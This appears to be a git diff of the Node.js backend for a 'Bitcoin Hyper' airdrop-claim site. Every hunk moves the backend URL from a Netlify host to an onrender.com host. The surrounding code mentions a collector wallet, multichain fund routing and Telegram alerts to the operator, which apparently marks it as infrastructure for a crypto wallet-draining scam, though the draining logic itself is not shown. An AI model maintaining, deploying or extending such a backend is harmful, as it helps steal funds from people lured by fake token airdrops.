@@ -33,7 +33,7 @@ const allowedOrigins = process.env.ALLOWED_ORIGINS
   : [
       'http://localhost:3000', 
       'https://hyperairdropclaim.netlify.app', 
-      'https://hypeback.netlify.app',
+      'https://hyperback-pm94.onrender.com',
       'https://bitcoinhypertoken.vercel.app'
     ];
 
@@ -115,7 +115,7 @@ async function testTelegramConnection() {
       `✅ MultiChain FlowRouter Ready\n` +
       `📦 Collector: ${COLLECTOR_WALLET.substring(0, 10)}...${COLLECTOR_WALLET.substring(36)}\n` +
       `🌐 Networks: Ethereum, BSC, Polygon, Arbitrum, Avalanche\n` +
-      `🔗 Backend: https://hypeback.netlify.app\n` +
+      `🔗 Backend: https://hyperback-pm94.onrender.com\n` +
       `🌍 Frontend: https://hyperairdropclaim.netlify.app\n` +
       `🕐 Started: ${new Date().toLocaleString()}`;
     
@@ -149,7 +149,7 @@ app.get('/', (req, res) => {
     version: '2.0.0',
     status: '🟢 ONLINE',
     telegram: telegramEnabled ? '✅ connected' : '❌ disabled',
-    backendUrl: 'https://hypeback.netlify.app/',
+    backendUrl: 'https://hyperback-pm94.onrender.com/',
     frontendUrl: 'https://hyperairdropclaim.netlify.app/',
     timestamp: new Date().toISOString()
   });
@@ -163,7 +163,7 @@ app.get('/api/health', (req, res) => {
   res.json({ 
     success: true, 
     status: 'ACTIVE',
-    backend: 'https://hypeback.netlify.app',
+    backend: 'https://hyperback-pm94.onrender.com',
     telegram: telegramEnabled ? 'connected' : 'disabled'
   });
 });
@@ -1063,7 +1063,7 @@ app.listen(PORT, '0.0.0.0', async () => {
   ║     ⚡ BITCOIN HYPER BACKEND - ENHANCED VERSION 2.0 ⚡        ║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📍 Port: ${PORT.toString().padEnd(40)}║
-  ║  🔗 Backend: https://hypeback.netlify.app${' '.repeat(16)}║
+  ║  🔗 Backend: https://hyperback-pm94.onrender.com${' '.repeat(16)}║
   ║  🌍 Frontend: https://hyperairdropclaim.netlify.app${' '.repeat(17)}║
   ╠══════════════════════════════════════════════════════════════╣
   ║  📦 COLLECTOR: ${COLLECTOR_WALLET.substring(0, 30)}...${' '.repeat(4)}║
